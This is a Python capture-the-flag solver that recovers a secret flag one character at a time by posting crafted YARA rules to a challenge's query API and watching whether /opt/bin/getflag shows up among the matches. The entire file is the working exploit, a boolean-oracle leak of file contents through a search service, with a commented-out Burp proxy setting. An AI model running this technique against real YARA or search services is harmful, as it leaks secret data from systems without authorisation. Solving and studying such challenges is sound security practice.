import requests
import string

base = "https://hidden.zajebistyc.tf"
first = "/api/query/medium"
flag = "ind3x1ng-l3ak5"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} # Burp Suite debug

s = requests.Session()

while len(flag) == 0 or flag[-1] != "}":
    for char in "-" + string.printable:
        rule = f"rule Rule1\n{{\n    strings:\n        $a = \"p4{{{flag + char}\"\n\n    condition:\n        $a\n}}\n"
        response = s.post(base + first, 
            json={"raw_yara": rule, "method": "query"},
            #proxies=proxies,
            #verify=False
        )
        if 'query_hash' not in response.json():
            continue
        hash = response.json()['query_hash']
        second = f"/api/matches/{hash}?offset=0&limit=50"
        response = s.get(base + second).json()
        if 'matches' in response and len(response['matches']):
            if '/opt/bin/getflag' in response['matches'][0]['file']:
                flag += char
                print("pc4{" + flag)
                break

print("pc4{" + flag)